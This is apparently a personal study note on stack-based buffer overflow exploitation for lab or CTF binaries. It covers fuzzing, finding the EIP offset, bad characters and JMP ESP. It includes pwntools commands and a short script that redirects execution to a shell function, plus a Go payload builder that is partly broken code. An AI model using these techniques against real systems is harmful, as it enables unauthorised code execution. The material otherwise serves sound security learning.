# Stackbased Buffer Overflows

## Finding the vulnerability:
1. Source code review
	1. Find vulnerable functions
2. [Fuzzing](https://en.wikipedia.org/wiki/Fuzzing)
	1.  Fuzz any input fields
3. Reverse Engineering
	1. Find vulnerable functions

Before getting excited consider if the target machine is protected with [[Binary-Exploitation-Protections]]

## Fuzzing HTTP protocol
[Microsoft TCPView](https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview) if debugger network listening does not work.

1. Use [[Wireshark]] to monitor traffic sent to application and follow TCP stream to show reply. 
2. [[Useful_Python]] PoC 
3. Run debugger Administrative priveleges attached to running of the vulnerable application
	1. Or for Windows [tcpview if immunity debugger listen column unavaliable](https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview)
	2. Attach process with immunity debugger

## Buffer Overflow Exploitation
Be aware alot of restarting required.
1. Enumerate till location EIP
	1. Binary Tree analysis - use pwntools `cyclic` or `msf-pattern_create -l $int`
	2. Update PoC
1. Check offset(skip binary tree analysis) with `msfpattern_offset -l $int -q $offsetpattern` or pwntools `offset`. From EIP the offset is located at relative memory address higher than EIP - closer to 0x0!.
	1. Add EIP variable to find exact EIP address.
1. Locating space for shellcode
1. Check for bad characters
1. Redirect the execution to flow:
	
Due address changing either due crashing-and-restarting application or ASLR ... we can just hardcode a static return address in general in modern binary exploitation.

6. Find a return address
7. Leverage a static address that contains a `JMP ESP`
	1. Must be static - no libraries compiled with ASLR support
	2. Not an address within the region to be occupied by the shellcode


One Consideration depending on the application and the type of vulnerability, there may be restrictions on the length of input passed to the application. In some cases, increasing the length of a buffer may result in a completely different crash. This is due the larger buffer overwrites additional data on the stack that is used by the target application, but could provide extra space for shellcode.

## pwntools
Enumeration
```bash
r < <(cyclic $INT) # cyclic input of $INT amount
cyclic -l EIP_Address # find out the amount of bytes of input need to expploit the binary
disassemble shell # find out where the shell function is in memory to set it to IP
# EITHER
# IF MANUAL WAY REMEMBER CORRECT ADDRESS LENGTH AND ENDIANNESS
# L->R = littleEndian; R->L = bigEndian
python -c 'print "A"*$INT + "$ADDR"' | /vuln/bin
python -c 'import struct;print "A"*44 + struct.pack("< ", $ADDR)' | /vuln/bin
```

Scripting the buffer overflow
```
from pwn import *
proc = process('/vuln/bin')
elf = ELF('/vuln/bin')
shell_func = elf.symbols.shell # CHANGE WHATEVER FORMAT REQUIRED
payload = fit({$INT: shell_func })
proc.sendline(payload)
proc.interactive()
```

## APPENDIX:

\\xCC as a graceful break for binex than crashing.

// ENDIANNESS tester
```c
#include <stdio.h>
union s{
	int n;
	char b;
}x;
void main(){
	x.n = 0x4142;
	if(x.b == 0x42){
		printf("Little Endian\n");
	}
	else{
		printf("Big Endian\n");
	}
}
```


```go
bof := strings.Builder{}
shell := ` `

offset := 608
rip := '0x' //store it to not overflow your own memory
formatRIP := //nice formatting hex function
nopSled := `\x90` 
safeJunk := `\xCC`
* someamount
payloadSize := offset + 8
shellSize := len(shell)
nopSize := len(nopSled)
padding := 'A' * (payloadSize - shellSize - nopSize)

bof.WriteString(nopSled, shell, padding, formatRIP)

payload := bof.String()

fmt.Printf("%s", payload)
```